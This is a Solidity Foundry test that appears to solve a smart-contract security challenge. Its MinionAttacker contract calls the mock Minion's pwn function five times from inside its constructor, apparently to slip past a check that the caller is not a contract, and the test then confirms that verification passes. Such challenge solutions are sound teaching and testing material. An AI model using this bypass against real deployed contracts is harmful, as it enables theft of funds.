pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/MockAccessControl.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
contract MockAccessControlTest is Test{
    Minion minion;
    address payable internal attacker;
    function setUp() public {
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker,100 ether);
        minion = new Minion();
    }
    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);

        MinionAttacker minionAttacker = new MinionAttacker{value: 1 ether}(minion,0.2 ether);
        require(minion.verify(address(minionAttacker)));

        vm.stopPrank();
        /** EXPLOIT END **/
    }
}

contract MinionAttacker is Ownable{
    constructor (Minion target,uint256 amt2Fwd) payable  {
        for(uint i=0; i<5; i++){
            target.pwn{value: amt2Fwd}();
        }
    }
    struct Call { address target; bytes callData; }
    struct Result { bool success; bytes returnData; }
    // To execute calls after deployment 
    // called by only owner
    function call(bool requireSuccess, Call[] memory calls) external onlyOwner returns (Result[] memory returnData) {
        returnData = new Result[](calls.length);
        for(uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory ret) = calls[i].target.call(calls[i].callData);

            if (requireSuccess) {
                require(success, " MinionAttacker# call failed");
            }

            returnData[i] = Result(success, ret);
        }
    }
    
}